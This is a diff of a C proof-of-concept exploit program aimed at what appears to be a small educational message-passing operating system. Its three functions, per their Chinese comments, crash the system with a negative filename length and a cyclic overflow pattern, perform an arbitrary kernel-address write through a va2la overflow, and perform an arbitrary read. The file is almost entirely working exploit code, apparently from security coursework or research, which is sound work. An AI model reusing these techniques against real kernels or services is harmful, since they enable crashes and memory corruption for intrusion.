@@ -1,15 +1,15 @@
 #include "type.h"
 #include "cmd_head.h"
 #include "stdio.h"
-
+// dbg __asm__ __volatile__("xchg %%bx, %%bx" ::: "memory");
 int poc1() // 触发系统崩溃重启
 {
     MESSAGE msg;
-    char path[] = "poc2_test";
+    char a[]="aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf";
     memset(&msg, 0, sizeof(msg));
     msg.type = OPEN;
     msg.FLAGS = O_RDWR | O_CREAT;
-    msg.PATHNAME = path;
+    msg.PATHNAME = a;
     msg.NAME_LEN = -1; // 恶意设置文件名长度为负值
     printf("hacking...NAME_LEN=%d...\n", msg.NAME_LEN);
     send_recv(BOTH, TASK_FS, &msg);
@@ -20,18 +20,18 @@ int poc1() // 触发系统崩溃重启
 int poc2() // 任意地址写
 {
     // 1. 创建并写入文件
-    int fd = open("poc1file", O_CREAT | O_RDWR);
+    int fd = open("poc2test", O_CREAT | O_RDWR);
     if (fd < 0)
     {
         printf("fail! fd=%d\n", fd);
         return -1;
     }
-    char payload[] = "1234567890";
+    char payload[] = "1234567890abcdef";
     write(fd, payload, strlen(payload));
     close(fd);
 
     // 2. 重新打开文件用于读取
-    fd = open("poc1file", O_RDWR);
+    fd = open("poc2test", O_RDWR);
     // 准备利用的缓冲区指针 (计算使 va2la 溢出)
     unsigned int seg_base = 0xc00000; // 当前进程段基址
     unsigned int target_addr = 0x0;   // 目标内核地址
@@ -46,8 +46,7 @@ int poc2() // 任意地址写
     return 0;
 }
 
-
-int poc3()//任意地址读
+int poc3() // 任意地址读
 {
     MESSAGE msg;
     int pid = getpid();
@@ -65,26 +64,30 @@ int poc3()//任意地址读
 
 int main(int argc, char *argv[])
 {
-    if (argc != 2 || argv[1] == 0) {
+    if (argc != 2 || argv[1] == 0)
+    {
         printf("usage: %s <poc_id>\n", argv[0]);
         return 1;
     }
 
     /* 严格：参数必须恰好是单字符 "1"/"2"/"3" */
-    if (argv[1][0] == '\0' || argv[1][1] != '\0') {
+    if (argv[1][0] == '\0' || argv[1][1] != '\0')
+    {
         printf("invalid poc\n");
         return 1;
     }
 
     char c = argv[1][0];
-    if (c < '1' || c > '3') {
+    if (c < '1' || c > '3')
+    {
         printf("invalid poc\n");
         return 1;
     }
 
     printf("poc %c\n", c);
 
-    switch (c) {
+    switch (c)
+    {
     case '1':
         poc1();
         break;
@@ -102,4 +105,3 @@ int main(int argc, char *argv[])
 
     return 0;
 }
-
